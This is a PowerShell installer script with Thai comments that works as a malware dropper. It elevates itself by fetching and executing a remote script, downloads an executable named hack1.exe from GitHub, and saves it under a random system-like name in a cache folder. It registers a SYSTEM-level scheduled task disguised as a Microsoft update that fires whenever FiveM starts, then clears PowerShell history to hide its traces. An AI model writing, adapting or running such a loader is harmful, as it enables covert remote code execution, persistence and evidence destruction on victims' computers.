# 1. [Self-Elevation] ตรวจสอบและขอสิทธิ์ Administrator
$scriptUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/install.ps1"

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$scriptUrl')`"" -Verb RunAs
    exit
}

# 2. [Configuration] ตั้งค่าตัวแปรและสุ่มชื่อไฟล์
$p_rand = @("font","drv","host","win","svc") | Get-Random
$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})

$fileName = "$p_rand$m_rand`_$r_rand.exe"
$taskName = "Microsoft_Update_$r_rand"
$dashboardUrl = "https://creative-bombolone-1e0912.netlify.app/"
$exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"

$destFolder = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
if (!(Test-Path $destFolder)) { New-Item -Path $destFolder -ItemType Directory -Force | Out-Null }
$destPath = "$destFolder\$fileName"

# 3. [Installation] เริ่มการติดตั้ง
try {
    Write-Host "[*] System Initializing..." -ForegroundColor Cyan
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing
    Unblock-File -Path $destPath

    # 4. [Persistence] แก้ไข XML Filter ใหม่ให้ Windows ยอมรับ (Standard Format)
    auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
    
    # ใช้ Filter แบบเจาะจง EventID 4688 ที่ระบุ Path FiveM โดยตรง (ปรับให้รองรับ Path มาตรฐาน)
    $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (Data='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe' or Data='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM_GTAProcess.exe')]]"
    
    # สร้าง Task Scheduler
    schtasks /create /tn "$taskName" /tr "'$destPath'" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f | Out-Null

    if ($?) {
        Write-Host "[+] Installation Complete." -ForegroundColor Green
        Start-Process $dashboardUrl
    } else {
        Write-Host "[-] Task creation failed. Trying secondary method..." -ForegroundColor Yellow
        # วิธีสำรอง: รันทันทีหาก Task สร้างไม่ได้
        Start-Process $destPath -WindowStyle Hidden
        Start-Process $dashboardUrl
    }

    # 5. [Anti-Forensics] ล้างประวัติ
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) { Clear-Content $historyPath -Force }
    Clear-History
}
catch {
    Write-Host "[-] Error occurred." -ForegroundColor Red
}
